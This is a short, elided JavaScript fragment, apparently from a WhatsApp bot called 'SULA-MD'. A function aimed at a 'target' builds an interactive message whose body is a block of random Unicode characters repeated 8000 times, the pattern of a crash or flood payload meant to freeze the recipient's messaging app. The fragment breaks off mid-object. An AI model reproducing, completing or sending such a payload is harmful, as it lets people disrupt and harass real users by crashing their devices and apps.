...
async function func1(target) {
    ...
    const message = {
        interactiveMessage: {
            ...
            body: {
                text: "𝐒𝐔𝐋𝐀-𝐌𝐃" + "䲹瑾ױ妋ᇪ䓫䭑㏶営疻㼬㤉攁濶⵷ᾈਰ䄪⃣双斐७檧浥❵夸刋淫歀旵穴ᭁ灭㜐䔎㖄砥⌻ẸⅮΏФ慠ጰ䀡̠佮⍰ৰ〨熔㸆㺗朜帏紇渥㚆䵙Ϫ亸磾૥㠳怨㴢㱈ل吡ᣂୡẽĭṛ椀伩吣㊛⪠怭壚ጁܲ熣ཱི⌽塑埩糝⿶൴ⶶ旣❏ఫඳ罎示㼓兄汆ᜮ楝ᬪ炘ዓ㡆⺞㚻ᶩ᜘⦆䰸憔᠀㿸ዼ曇峴ᯰ⌮䗀ཽò巿桚泡勜纺㎗ᠤ敐゠⎙ྸ㎏剪ᣲ㩑䪕㤛畼".repeat(8000)  
            },
            nativeFlowMessage: {},
            contextInfo: {
